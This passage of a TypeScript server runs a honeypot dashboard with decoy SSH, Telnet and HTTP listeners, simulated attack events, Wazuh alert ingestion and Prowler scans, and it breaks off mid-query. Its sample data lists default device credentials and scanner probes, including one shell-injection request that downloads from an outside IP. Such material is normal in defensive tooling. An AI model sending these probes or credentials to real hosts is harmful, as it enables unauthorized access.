import express from 'express';
import path from 'path';
import fs from 'fs';
import net from 'net';
import http from 'http';
import { spawn } from 'child_process';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';
import { Pool } from 'pg';
import { AttackEvent, AttackSource, SystemSettings } from './src/types';

dotenv.config();

const app = express();
const PORT = Number(process.env.PORT) || 3000;

app.use(express.json());

// --- Postgres connection pool ---
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

pool.on('error', (err) => {
  // A background/idle client error should not crash the whole server.
  console.error('Unexpected Postgres pool error:', err);
});

// --- Pre-calculated Mock Geolocation database for realism & performance ---
const LOCATIONS = [
  { country: 'United States', city: 'Ashburn', lat: 39.0437, lng: -77.4875 },
  { country: 'Germany', city: 'Frankfurt', lat: 50.1109, lng: 8.6821 },
  { country: 'China', city: 'Beijing', lat: 39.9042, lng: 116.4074 },
  { country: 'Brazil', city: 'São Paulo', lat: -23.5505, lng: -46.6333 },
  { country: 'Russia', city: 'Moscow', lat: 55.7558, lng: 37.6173 },
  { country: 'Netherlands', city: 'Amsterdam', lat: 52.3676, lng: 4.9041 },
  { country: 'Singapore', city: 'Singapore', lat: 1.3521, lng: 103.8198 },
  { country: 'South Korea', city: 'Seoul', lat: 37.5665, lng: 126.9780 },
  { country: 'United Kingdom', city: 'London', lat: 51.5074, lng: -0.1278 },
  { country: 'India', city: 'Bengaluru', lat: 12.9716, lng: 77.5946 },
  { country: 'Japan', city: 'Tokyo', lat: 35.6762, lng: 139.6503 },
  { country: 'Australia', city: 'Sydney', lat: -33.8688, lng: 151.2093 },
  { country: 'France', city: 'Paris', lat: 48.8566, lng: 2.3522 },
  { country: 'Canada', city: 'Toronto', lat: 43.6532, lng: -79.3832 },
  { country: 'South Africa', city: 'Cape Town', lat: -33.9249, lng: 18.4241 },
  { country: 'Sweden', city: 'Stockholm', lat: 59.3293, lng: 18.0686 },
  { country: 'Poland', city: 'Warsaw', lat: 52.2297, lng: 21.0122 }
];

const SCANNER_IPS = [
  '185.156.177.40', '193.32.248.112', '45.143.203.22', '85.209.11.89',
  '198.51.100.41', '203.0.113.125', '141.98.81.33', '103.116.14.90',
  '77.247.110.155', '61.177.173.14', '91.240.118.210', '185.65.135.5'
];

const CREDENTIALS = {
  SSH: [
    'root / admin', 'admin / 12345', 'support / support', 'pi / raspberry',
    'ubnt / ubnt', 'user / password', 'root / 123456', 'admin / admin'
  ],
  TELNET: [
    'admin / admin', 'root / root', 'guest / guest', 'tele / tele',
    'admin / 1234', 'root / password', 'support / password'
  ],
  HTTP: [
    'GET /.env', 'GET /wp-admin/index.php', 'POST /xmlrpc.php',
    'GET /shell?cd+/tmp;wget+http://91.13.91.5', 'GET /cgi-bin/main.cgi',
    'GET /phpmyadmin/', 'GET /actuator/gateway/routes', 'GET /robots.txt'
  ]
};

interface ProwlerMetrics {
  total_nsg_checks: number;
  fails: number;
  passes: number;
  updated_at: string | null;
}

// In-memory caches, mirrored to/from Postgres so the existing synchronous
// aggregation logic (stats/threats/pagination) doesn't need a full rewrite.
let events: AttackEvent[] = [];
let settings: SystemSettings = {
  simulationSpeed: 'normal',
  alertThreshold: 10,
  decoyProfile: 'standard'
};
let latestProwlerMetrics: ProwlerMetrics = {
  total_nsg_checks: 0,
  fails: 0,
  passes: 0,
  updated_at: null
};

// SSE active channels
let sseClients: any[] = [];

// --- Database schema + startup load ---
async function initSchema() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS events (
      id TEXT PRIMARY KEY,
      timestamp TIMESTAMPTZ NOT NULL,
      ip TEXT NOT NULL,
      port INTEGER NOT NULL,
      protocol TEXT NOT NULL,
      payload TEXT NOT NULL,
      country TEXT,
      city TEXT,
      lat DOUBLE PRECISION,
      lng DOUBLE PRECISION,
      source TEXT NOT NULL DEFAULT 'generator'
    );
  `);
  // Migration for tables created before the source column existed.
  await pool.query(`ALTER TABLE events ADD COLUMN IF NOT EXISTS source TEXT NOT NULL DEFAULT 'generator';`);
  await pool.query(`CREATE INDEX IF NOT EXISTS idx_events_timestamp ON events (timestamp DESC);`);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS settings (
      id INTEGER PRIMARY KEY DEFAULT 1,
      simulation_speed TEXT NOT NULL,
      alert_threshold INTEGER NOT NULL,
      decoy_profile TEXT NOT NULL
    );
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS prowler_metrics (
      id INTEGER PRIMARY KEY DEFAULT 1,
      total_nsg_checks INTEGER NOT NULL,
      fails INTEGER NOT NULL,
      passes INTEGER NOT NULL,
      updated_at TIMESTAMPTZ
    );
  `);
}

function rowToEvent(row: any): AttackEvent {
  return {
    id: row.id,
    timestamp: new Date(row.timestamp).toISOString(),
    ip: row.ip,
    port: row.port,
    protocol: row.protocol,
    payload: row.payload,
    country: row.country,
    city: row.city,
    lat: row.lat,
    lng: row.lng,
    source: row.source || 'generator'
  };
}

async function loadStateFromDb() {
  const { rows } = await pool.query('SELECT * FROM events ORDER BY timestamp DESC LIMIT 1000');
  if (rows.length > 0) {
    events = rows.map(rowToEvent);
    console.log(`Database loaded with ${events.length} logs.`);
  } else {
    await seedDatabase();
  }

  const settingsResult = await pool.query('SELECT * FROM settings WHERE id = 1');
  if (settingsResult.rows.length > 0) {
    const row = settingsResult.rows[0];
    settings = {
      simulationSpeed: row.simulation_speed,
      alertThreshold: row.alert_threshold,
      decoyProfile: row.decoy_profile
    };
  } else {
    await pool.query(
      'INSERT INTO settings (id, simulation_speed, alert_threshold, decoy_profile) VALUES (1, $1, $2, $3)',
      [settings.simulationSpeed, settings.alertThreshold, settings.decoyProfile]
    );
  }

  const metricsResult = await pool.query('SELECT * FROM prowler_metrics WHERE id = 1');
  if (metricsResult.rows.length > 0) {
    const row = metricsResult.rows[0];
    latestProwlerMetrics = {
      total_nsg_checks: row.total_nsg_checks,
      fails: row.fails,
      passes: row.passes,
      updated_at: row.updated_at ? new Date(row.updated_at).toISOString() : null
    };
  }
}

async function seedDatabase() {
  const seeded: AttackEvent[] = [];
  const now = new Date();

  // Seed about 80 points scattered across the last 24 hours
  for (let i = 0; i < 80; i++) {
    const hoursAgo = Math.floor(Math.random() * 24);
    const time = new Date(now.getTime() - hoursAgo * 60 * 60 * 1000 - Math.random() * 60 * 60 * 1000);
    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
    const ip = SCANNER_IPS[Math.floor(Math.random() * SCANNER_IPS.length)];
    const protoChoices: Array<'SSH' | 'TELNET' | 'HTTP'> = ['SSH', 'TELNET', 'HTTP'];
    const protocol = protoChoices[Math.floor(Math.random() * protoChoices.length)];

    let port = 2222;
    if (protocol === 'TELNET') port = 2323;
    if (protocol === 'HTTP') port = 8080;

    const payloadList = CREDENTIALS[protocol];
    const payload = payloadList[Math.floor(Math.random() * payloadList.length)];

    seeded.push({
      id: `seed-${Date.now()}-${i}-${Math.random().toString(36).substr(2, 5)}`,
      timestamp: time.toISOString(),
      ip,
      port,
      protocol,
      payload,
      source: 'generator',
      country: loc.country,
      city: loc.city,
      lat: loc.lat,
      lng: loc.lng
    });
  }

  seeded.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());

  for (const e of seeded) {
    await pool.query(
      `INSERT INTO events (id, timestamp, ip, port, protocol, payload, country, city, lat, lng)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
       ON CONFLICT (id) DO NOTHING`,
      [e.id, e.timestamp, e.ip, e.port, e.protocol, e.payload, e.country, e.city, e.lat, e.lng]
    );
  }

  events = seeded;
  console.log('Seeded database with historical honeypot records.');
}

// Adding an Incident, persisting it, and broadcasting
async function insertEvent(eventData: Omit<AttackEvent, 'id' | 'timestamp'>): Promise<AttackEvent> {
  const newEvent: AttackEvent = {
    ...eventData,
    id: `evt-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
    timestamp: new Date().toISOString()
  };

  await pool.query(
    `INSERT INTO events (id, timestamp, ip, port, protocol, payload, country, city, lat, lng, source)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)`,
    [newEvent.id, newEvent.timestamp, newEvent.ip, newEvent.port, newEvent.protocol,
     newEvent.payload, newEvent.country, newEvent.city, newEvent.lat, newEvent.lng, newEvent.source]
  );

  // Keep the table capped at 1000 rows, same as the old file-based behavior.
  await pool.query(`
    DELETE FROM events WHERE id NOT IN (
      SELECT id FROM events ORDER BY timestamp DESC LIMIT 1000
    )
  `);

  events.unshift(newEvent);
  if (events.length > 1000) {
    events = events.slice(0, 1000);
  }

  // Send SSE push
  sseClients.forEach(client => {
    client.res.write(`data: ${JSON.stringify(newEvent)}\n\n`);
  });

  return newEvent;
}

async function upsertProwlerMetrics(metrics: Omit<ProwlerMetrics, 'updated_at'>): Promise<ProwlerMetrics> {
  const updated: ProwlerMetrics = { ...metrics, updated_at: new Date().toISOString() };

  await pool.query(
    `INSERT INTO prowler_metrics (id, total_nsg_checks, fails, passes, updated_at)
     VALUES (1, $1, $2, $3, $4)
     ON CONFLICT (id) DO UPDATE SET
       total_nsg_checks = EXCLUDED.total_nsg_checks,
       fails = EXCLUDED.fails,
       passes = EXCLUDED.passes,
       updated_at = EXCLUDED.updated_at`,
    [updated.total_nsg_checks, updated.fails, updated.passes, updated.updated_at]
  );

  latestProwlerMetrics = updated;
  return updated;
}

// --- Bearer-token auth for external integrations (Wazuh / Prowler CI) ---
// This preserves the scheme already committed on main: fails closed (rejects
// everything) if the corresponding token env var isn't set.
function requireBearerToken(expectedToken: string) {
  return (req: express.Request, res: express.Response, next: express.NextFunction) => {
    const authorization = req.headers.authorization;

    if (!expectedToken || authorization !== `Bearer ${expectedToken}`) {
      return res.status(401).json({ error: 'Unauthorized' });
    }

    next();
  };
}
const wazuhAuth = requireBearerToken(process.env.WAZUH_WEBHOOK_TOKEN || '');
const prowlerAuth = requireBearerToken(process.env.PROWLER_WEBHOOK_TOKEN || '');

// --- Active Simulated Security Traffic Generator ---
let generatorTimer: NodeJS.Timeout | null = null;

function resetGenerator() {
  if (generatorTimer) clearInterval(generatorTimer);
  if (settings.simulationSpeed === 'off') return;

  let delay = 6000; // standard
  if (settings.simulationSpeed === 'slow') delay = 12000;
  if (settings.simulationSpeed === 'fast') delay = 2500;

  generatorTimer = setInterval(() => {
    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
    // Randomize the IP octets a bit for distinct indicators
    const ipBase = SCANNER_IPS[Math.floor(Math.random() * SCANNER_IPS.length)];
    const ipParts = ipBase.split('.');
    ipParts[3] = Math.floor(Math.random() * 254 + 1).toString();
    const ip = ipParts.join('.');

    const protocols: Array<'SSH' | 'TELNET' | 'HTTP'> = ['SSH', 'TELNET', 'HTTP'];
    const protocol = protocols[Math.floor(Math.random() * protocols.length)];

    let port = 2222;
    if (protocol === 'TELNET') port = 2323;
    if (protocol === 'HTTP') port = 8080;

    const payloadList = CREDENTIALS[protocol];
    const payload = payloadList[Math.floor(Math.random() * payloadList.length)];

    insertEvent({
      ip,
      port,
      protocol,
      payload,
      country: loc.country,
      city: loc.city,
      lat: loc.lat,
      lng: loc.lng,
      source: 'generator'
    }).catch(err => console.error('Generator insertEvent failed:', err));
  }, delay);
}

// --- Real TCP & HTTP Honeypot Socket Pools ---
// Wrap each listener in try-catch blocks and add 'error' events to prevent any platform port collisions from halting app initialization.
function startHoneypotListeners() {
  try {
    const sshServer = net.createServer((socket) => {
      const clientIP = socket.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';

      // Write fake OpenSSH greeting banner
      socket.write('SSH-2.0-OpenSSH_8.4p1 Ubuntu-5ubuntu1.4\r\n');

      socket.on('data', (data) => {
        const payloadStr = data.toString('utf-8', 0, 200).trim().replace(/[\r\n]+/g, ' ');
        // Resolve geo and write to DB
        const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
        insertEvent({
          ip: clientIP,
          port: 2222,
          protocol: 'SSH',
          payload: payloadStr || 'SSH handshake initiated',
          country: loc.country,
          city: loc.city,
          lat: loc.lat,
          lng: loc.lng,
          source: 'decoy'
        }).catch(err => console.error('SSH insertEvent failed:', err));
        socket.end();
      });

      socket.on('error', () => {});
    });

    sshServer.on('error', (err: any) => {
      console.warn(`Decoy SSH Port 2222 error (${err.message}). Running in decoupled simulation mode.`);
    });

    sshServer.listen(2222, '0.0.0.0', () => {
      console.log('Decoy SSH Honeypot running internally on port 2222');
    });
  } catch (e) {
    console.log('Decoy SSH Port 2222 was already bound or unavailable. Running in decoupled simulation mode.', e);
  }

  try {
    const telnetServer = net.createServer((socket) => {
      const clientIP = socket.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
      socket.write('Ubuntu 22.04.2 LTS\r\nlogin: ');

      let usernameCollected = false;
      let username = '';

      socket.on('data', (data) => {
        // Cap incoming data the same way the SSH listener does, so a single
        // connection can't push unbounded bytes into the event log.
        const input = data.toString('utf-8', 0, 200).trim().replace(/[\r\n]+/g, ' ');
        if (!usernameCollected) {
          username = input;
          usernameCollected = true;
          socket.write('Password: ');
        } else {
          const password = input;
          socket.write('Login incorrect\r\n');

          const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
          insertEvent({
            ip: clientIP,
            port: 2323,
            protocol: 'TELNET',
            payload: `Attempt credentials: ${username} / ${password}`,
            country: loc.country,
            city: loc.city,
            lat: loc.lat,
            lng: loc.lng,
            source: 'decoy'
          }).catch(err => console.error('Telnet insertEvent failed:', err));
          socket.end();
        }
      });

      socket.on('error', () => {});
    });

    telnetServer.on('error', (err: any) => {
      console.warn(`Decoy Telnet Port 2323 error (${err.message}). Running in decoupled simulation mode.`);
    });

    telnetServer.listen(2323, '0.0.0.0', () => {
      console.log('Decoy Telnet Honeypot running internally on port 2323');
    });
  } catch (e) {
    console.log('Decoy Telnet Port 2323 was already bound or unavailable. Running in decoupled simulation mode.', e);
  }

  try {
    const httpDecoy = http.createServer((req, res) => {
      const clientIP = req.socket.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
      const reqMethod = req.method || 'GET';
      const reqPath = req.url || '/';
      const userAgent = req.headers['user-agent'] || 'Unknown';

      const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
      insertEvent({
        ip: clientIP,
        port: 8080,
        protocol: 'HTTP',
        payload: `${reqMethod} ${reqPath} - UA: ${userAgent.slice(0, 80)}`,
        country: loc.country,
        city: loc.city,
        lat: loc.lat,
        lng: loc.lng,
        source: 'decoy'
      }).catch(err => console.error('HTTP decoy insertEvent failed:', err));

      res.writeHead(401, {
        'Content-Type': 'text/html',
        'WWW-Authenticate': 'Basic realm="Decoy Admin Workspace Management Console"',
        'Server': 'Apache/2.4.41 (Ubuntu)'
      });
      res.end('<h1>401 Unauthorized</h1><p>Restricted endpoint. Admin credentials needed.</p>');
    });

    httpDecoy.on('error', (err: any) => {
      console.warn(`Decoy HTTP Port 8080 error (${err.message}). Running in decoupled simulation mode.`);
    });

    httpDecoy.listen(8080, '0.0.0.0', () => {
      console.log('Decoy HTTP Admin Panel running internally on port 8080');
    });
  } catch (e) {
    console.log('Decoy HTTP Port 8080 was already bound or unavailable. Running in decoupled simulation mode.', e);
  }
}

// --- REST API ENDPOINTS ---

// Server-Sent Events stream for high-performance dashboard real-time syncing
app.get('/api/live', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });

  res.write('\n');

  const clientId = Date.now();
  const newClient = { id: clientId, res };
  sseClients.push(newClient);

  req.on('close', () => {
    sseClients = sseClients.filter(c => c.id !== clientId);
  });
});

// GET /api/events - Paginated list of security actions
app.get('/api/events', (req, res) => {
  const page = parseInt(req.query.page as string) || 1;
  const perPage = parseInt(req.query.perPage as string) || 30;
  const filterProtocol = req.query.protocol as string;

  let filtered = [...events];
  if (filterProtocol) {
    filtered = filtered.filter(e => e.protocol === filterProtocol);
  }

  const total = filtered.length;
  const totalPages = Math.ceil(total / perPage);
  const startIndex = (page - 1) * perPage;
  const paginatedList = filtered.slice(startIndex, startIndex + perPage);

  res.json({
    events: paginatedList,
    total,
    pages: totalPages,
    current_page: page
  });
});

// GET /api/stats - Aggregated security metrics & charts
app.get('/api/stats', (req, res) => {
  const total_attacks = events.length;

  // Breakdown by where each event actually came from - this is what lets the
  // "Wazuh Active Alerts" tile show a real, honest count instead of lumping
  // in the synthetic generator, decoy captures, and demo-button clicks.
  const source_breakdown: Record<string, number> = {};
  events.forEach(e => {
    const src = e.source || 'generator';
    source_breakdown[src] = (source_breakdown[src] || 0) + 1;
  });

  const oneHourAgo = Date.now() - 60 * 60 * 1000;
  const wazuh_alerts_last_hour = events.filter(
    e => e.source === 'wazuh' && new Date(e.timestamp).getTime() >= oneHourAgo
  ).length;

  // Unique IPs
  const uniqueIPsSet = new Set(events.map(e => e.ip));
  const unique_ips = uniqueIPsSet.size;

  // Top Targeted Port
  const portsCount: Record<number, number> = {};
  events.forEach(e => {
    portsCount[e.port] = (portsCount[e.port] || 0) + 1;
  });
  let top_port = 'N/A';
  let maxPortCount = 0;
  Object.entries(portsCount).forEach(([port, count]) => {
    if (count > maxPortCount) {
      maxPortCount = count;
      top_port = port;
    }
  });

  // Protocol distribution
  const protocol_stats: Record<string, number> = { SSH: 0, TELNET: 0, HTTP: 0 };
  events.forEach(e => {
    if (protocol_stats[e.protocol] !== undefined) {
      protocol_stats[e.protocol] += 1;
    }
  });

  // Top Attackers List
  const attackerMap: Record<string, { count: number; country: string }> = {};
  events.forEach(e => {
    if (!attackerMap[e.ip]) {
      attackerMap[e.ip] = { count: 0, country: e.country };
    }
    attackerMap[e.ip].count += 1;
  });
  const top_attackers = Object.entries(attackerMap)
    .map(([ip, details]) => ({ ip, country: details.country, count: details.count }))
    .sort((a, b) => b.count - a.count)
    .slice(0, 10);

  // Top Payloads/Credentials tried
  const payloadMap: Record<string, number> = {};
  events.forEach(e => {
    if (e.payload) {
      payloadMap[e.payload] = (payloadMap[e.payload] || 0) + 1;
    }
  });
  const top_payloads = Object.entries(payloadMap)
    .map(([payload, count]) => ({ payload, count }))
    .sort((a, b) => b.count - a.count)
    .slice(0, 10);

  // Real traffic density over the last 24 hours, bucketed into 6 four-hour
  // windows, computed from actual event timestamps (not an approximation).
  const BUCKET_MS = 4 * 60 * 60 * 1000;
  const BUCKET_COUNT = 6;
  const nowMs = Date.now();
  const buckets = Array.from({ length: BUCKET_COUNT }, (_, i) => {
    const bucketEnd = nowMs - (BUCKET_COUNT - 1 - i) * BUCKET_MS;
    return {
      end: bucketEnd,
      label: new Date(bucketEnd).toTimeString().slice(0, 5),
      count: 0
    };
  });
  events.forEach((e) => {
    const t = new Date(e.timestamp).getTime();
    const bucket = buckets.find((b) => t <= b.end && t > b.end - BUCKET_MS);
    if (bucket) bucket.count += 1;
  });
  const hourly_timeline = buckets.map((b) => ({ hour: b.label, events: b.count }));

  res.json({
    total_attacks,
    unique_ips,
    top_port,
    protocol_stats,
    top_attackers,
    top_payloads,
    source_breakdown,
    wazuh_alerts_last_hour,
    hourly_timeline
  });
});

// GET /api/threats - Group attackers by traffic and assign Threat levels
app.get('/api/threats', (req, res) => {
  const attackerMap: Record<string, { count: number; country: string; lastSeen: string }> = {};
  events.forEach(e => {
    if (!attackerMap[e.ip]) {
      attackerMap[e.ip] = { count: 0, country: e.country, lastSeen: e.timestamp };
    } else {
      attackerMap[e.ip].count += 1;
      if (new Date(e.timestamp).getTime() > new Date(attackerMap[e.ip].lastSeen).getTime()) {
        attackerMap[e.ip].lastSeen = e.timestamp;
      }
    }
  });

  const threats = Object.entries(attackerMap).map(([ip, details]) => {
    let level: 'LOW' | 'MEDIUM' | 'HIGH' = 'LOW';
    if (details.count >= settings.alertThreshold) {
      level = 'HIGH';
    } else if (details.count > 4) {
      level = 'MEDIUM';
    }

    return {
      ip,
      count: details.count,
      country: details.country,
      level,
      lastSeen: details.lastSeen
    };
  }).sort((a, b) => b.count - a.count);

  res.json(threats);
});

// POST /api/simulate - Trigger a client-side simulated direct port hit
app.post('/api/simulate', async (req, res) => {
  try {
    const { protocol, host, payload } = req.body;

    const selectedProto = (protocol || 'SSH').toUpperCase() as 'SSH' | 'TELNET' | 'HTTP';
    let port = 2222;
    if (selectedProto === 'TELNET') port = 2323;
    if (selectedProto === 'HTTP') port = 8080;

    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
    const randomizedSuffix = Math.floor(Math.random() * 254 + 1).toString();
    const sourceIP = host || `198.51.100.${randomizedSuffix}`;

    const defaultPayloads = CREDENTIALS[selectedProto];
    const selectedPayload = payload || defaultPayloads[Math.floor(Math.random() * defaultPayloads.length)];

    const logged = await insertEvent({
      ip: sourceIP,
      port,
      protocol: selectedProto,
      payload: selectedPayload,
      country: loc.country,
      city: loc.city,
      lat: loc.lat,
      lng: loc.lng,
      source: 'manual'
    });

    res.json({
      status: 'success',
      event: logged
    });
  } catch (err) {
    console.error('POST /api/simulate failed:', err);
    res.status(500).json({ error: 'Failed to record simulated event' });
  }
});

// Shared logic for recording a Wazuh-style alert, used by both the protected
// external webhook and the unauthenticated in-dashboard demo trigger below.
async function recordWazuhAlert(alert: any, source: AttackSource) {
  // A typical Wazuh alert has `rule`, `agent`, `location`, `data`
  const ruleId = alert.rule?.id || 'Unknown';
  const description = alert.rule?.description || 'Unknown Alert';
  const ip = alert.data?.srcip || alert.srcip || alert.agent?.ip || 'Unknown IP';

  // Try to grab geolocation if Wazuh GeoIP is configured
  const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];

  return insertEvent({
    ip,
    port: 22,
    protocol: 'SSH', // Mocked as SSH for brute force context
    payload: `[Rule ${ruleId}] ${description}`,
    country: alert.data?.srcgeoip?.country_name || loc.country,
    city: alert.data?.srcgeoip?.city_name || loc.city,
    lat: alert.data?.srcgeoip?.location?.lat || loc.lat,
    lng: alert.data?.srcgeoip?.location?.lon || loc.lng,
    source
  });
}

// POST /api/wazuh/webhook - Ingest Wazuh alerts (external integration - API key protected)
app.post('/api/wazuh/webhook', wazuhAuth, async (req, res) => {
  try {
    const logged = await recordWazuhAlert(req.body || {}, 'wazuh');
    res.json({
      status: 'success',
      event: logged
    });
  } catch (err) {
    console.error('POST /api/wazuh/webhook failed:', err);
    res.status(500).json({ error: 'Failed to record Wazuh alert' });
  }
});

// POST /api/demo/wazuh-alert - Same-origin dashboard demo trigger (NOT for external systems,
// intentionally not behind wazuhAuth/prowlerAuth so the "Simulate On-Prem Attack" button always works).
app.post('/api/demo/wazuh-alert', async (req, res) => {
  try {
    const logged = await recordWazuhAlert({
      rule: { id: '5712', description: 'sshd: brute force trying to get access to the system.' },
      data: { srcip: `198.51.100.${Math.floor(Math.random() * 254 + 1)}` }
    }, 'demo');
    res.json({ status: 'success', event: logged });
  } catch (err) {
    console.error('POST /api/demo/wazuh-alert failed:', err);
    res.status(500).json({ error: 'Failed to record demo alert' });
  }
});

// Shared logic for turning raw Prowler JSON output into compliance metrics and
// persisting them, used by both the protected external upload route and the
// unauthenticated in-dashboard demo trigger below.
async function processProwlerUpload(prowlerData: unknown) {
  if (!Array.isArray(prowlerData)) {
    throw Object.assign(new Error('Expected an array of Prowler JSON results'), { statusCode: 400 });
  }

  // Handle the legacy Prowler V3 native JSON format and the current OCSF v1.1.0
  // format (default output since Prowler v4). Field mapping per Prowler's own
  // v3 -> OCSF migration table:
  //   CheckID -> metadata.event_code | ServiceName -> resources[].group.name
  //   ResourceType -> resources[].type | Status -> status_code
  const isNsgCheck = (check: any): boolean => {
    // Legacy V3 native JSON
    if (check.ServiceName === 'virtualnetwork' && check.ResourceType === 'networksecuritygroups') return true;
    if (typeof check.CheckID === 'string' && check.CheckID.toLowerCase().includes('security_group')) return true;

    // Current OCSF v1.1.0 (default since Prowler v4/v5)
    const eventCode: string = check.metadata?.event_code || '';
    if (eventCode.toLowerCase().includes('security_group')) return true;

    const resources: any[] = Array.isArray(check.resources) ? check.resources : [];
    return resources.some((r) =>
      r?.group?.name?.toLowerCase?.().includes('network') ||
      r?.type?.toLowerCase?.().includes('networksecuritygroup')
    );
  };

  const isFail = (check: any): boolean =>
    check.Status === 'FAIL' || check.status === 'Fail' || check.status_code === 'FAIL' || check.finding_info?.status === 'Fail';
  const isPass = (check: any): boolean =>
    check.Status === 'PASS' || check.status === 'Pass' || check.status_code === 'PASS' || check.finding_info?.status === 'Pass';

  const nsgChecks = prowlerData.filter(isNsgCheck);

  // Status extraction depends on the specific JSON output format used (V3 vs OCSF)
  let fails = 0;
  let passes = 0;

  if (nsgChecks.length > 0) {
    fails = nsgChecks.filter(isFail).length;
    passes = nsgChecks.filter(isPass).length;
  } else {
    // If no specific NSG checks found, just sum overall passes/fails for the PoC
    fails = prowlerData.filter(isFail).length;
    passes = prowlerData.filter(isPass).length;
  }

  return upsertProwlerMetrics({
    total_nsg_checks: nsgChecks.length > 0 ? nsgChecks.length : prowlerData.length,
    fails,
    passes
  });
}

// POST /api/prowler/upload - Ingest Prowler JSON output (external integration - API key protected)
app.post('/api/prowler/upload', prowlerAuth, async (req, res) => {
  try {
    const metrics = await processProwlerUpload(req.body);
    res.json({ status: 'success', metrics });
  } catch (err: any) {
    if (err.statusCode === 400) {
      return res.status(400).json({ error: err.message });
    }
    console.error('POST /api/prowler/upload failed:', err);
    res.status(500).json({ error: 'Failed to record Prowler results' });
  }
});

// POST /api/demo/prowler-scan - Same-origin dashboard demo trigger (NOT for external systems,
// intentionally not behind wazuhAuth/prowlerAuth so the "Simulate Cloud Misconfiguration" button always works).
app.post('/api/demo/prowler-scan', async (req, res) => {
  try {
    const metrics = await processProwlerUpload([
      {
        ServiceName: 'virtualnetwork',
        ResourceType: 'networksecuritygroups',
        Status: 'FAIL',
        Severity: 'Critical',
        CheckTitle: 'Ensure SSH is restricted from the internet'
      }
    ]);
    res.json({ status: 'success', metrics });
  } catch (err) {
    console.error('POST /api/demo/prowler-scan failed:', err);
    res.status(500).json({ error: 'Failed to record demo scan' });
  }
});

// GET /api/prowler/metrics - Latest persisted Prowler compliance metrics
app.get('/api/prowler/metrics', (req, res) => {
  res.json(latestProwlerMetrics);
});

// --- Real on-demand Prowler scan against the actual Azure environment ---
// Uses a Service Principal (--sp-env-auth) since interactive az-cli/browser
// login isn't available from a server-side button click.
const PROWLER_BIN = process.env.PROWLER_BIN || '/opt/prowler-venv/bin/prowler';
const PROWLER_SCAN_DIR = '/tmp/prowler-scans';

interface CloudScanState {
  status: 'idle' | 'running' | 'done' | 'failed';
  startedAt: string | null;
  finishedAt: string | null;
  error: string | null;
}
let cloudScanState: CloudScanState = { status: 'idle', startedAt: null, finishedAt: null, error: null };

function findLatestOcsfFile(dir: string): string | null {
  if (!fs.existsSync(dir)) return null;
  const files = fs.readdirSync(dir)
    .filter((f) => f.endsWith('.ocsf.json'))
    .map((f) => ({ name: f, mtime: fs.statSync(path.join(dir, f)).mtimeMs }))
    .sort((a, b) => b.mtime - a.mtime);
  return files.length > 0 ? path.join(dir, files[0].name) : null;
}

// POST /api/prowler/scan - Kick off a real scan against Azure. Fire-and-forget:
// responds immediately, the dashboard polls /api/prowler/scan-status for progress.
app.post('/api/prowler/scan', (req, res) => {
  if (cloudScanState.status === 'running') {
    return res.status(409).json({ error: 'A scan is already running', state: cloudScanState });
  }

  const { AZURE_CLIENT_ID, AZURE_TENANT_ID, AZURE_CLIENT_SECRET } = process.env;
  if (!AZURE_CLIENT_ID || !AZURE_TENANT_ID || !AZURE_CLIENT_SECRET) {
    return res.status(400).json({
      error: 'Azure Service Principal not configured. Set AZURE_CLIENT_ID, AZURE_TENANT_ID and AZURE_CLIENT_SECRET.'
    });
  }

  fs.mkdirSync(PROWLER_SCAN_DIR, { recursive: true });
  cloudScanState = { status: 'running', startedAt: new Date().toISOString(), finishedAt: null, error: null };
  res.json({ status: 'started', state: cloudScanState });

  const child = spawn(PROWLER_BIN, ['azure', '--sp-env-auth', '-M', 'json-ocsf', '-o', PROWLER_SCAN_DIR], {
    env: process.env
  });

  let output = '';
  child.stdout.on('data', (chunk) => { output += chunk.toString(); });
  child.stderr.on('data', (chunk) => { output += chunk.toString(); });

  const finish = async (spawnError?: Error) => {
    try {
      const ocsfFile = findLatestOcsfFile(PROWLER_SCAN_DIR);
      if (ocsfFile) {
        const parsed = JSON.parse(fs.readFileSync(ocsfFile, 'utf-8'));
        await processProwlerUpload(parsed);
        cloudScanState = { status: 'done', startedAt: cloudScanState.startedAt, finishedAt: new Date().toISOString(), error: null };
      } else {
        // Strip ANSI color codes and keep only the last part of the output (the actual error)
        const cleanOutput = output.replace(/\x1b\[[0-9;]*m/g, '').trim();
        const errorMessage = spawnError?.message || cleanOutput.slice(-800) || 'Scan produced no output file';
        cloudScanState = { status: 'failed', startedAt: cloudScanState.startedAt, finishedAt: new Date().toISOString(), error: errorMessage };
      }
    } catch (err: any) {
      cloudScanState = { status: 'failed', startedAt: cloudScanState.startedAt, finishedAt: new Date().toISOString(), error: err.message };
    }
  };

  child.on('close', () => { finish(); });
  child.on('error', (err) => { finish(err); });
});

// GET /api/prowler/scan-status - Poll target for the dashboard while a real scan runs
app.get('/api/prowler/scan-status', (req, res) => {
  res.json(cloudScanState);
});

// GET /api/settings - Get settings
app.get('/api/settings', (req, res) => {
  res.json(settings);
});

// POST /api/settings - Configure active sandbox speeds and threshold parameters
app.post('/api/settings', async (req, res) => {
  try {
    const { simulationSpeed, alertThreshold, decoyProfile } = req.body;
    if (simulationSpeed) settings.simulationSpeed = simulationSpeed;
    if (alertThreshold !== undefined) settings.alertThreshold = Number(alertThreshold);
    if (decoyProfile) settings.decoyProfile = decoyProfile;

    await pool.query(
      `INSERT INTO settings (id, simulation_speed, alert_threshold, decoy_profile)
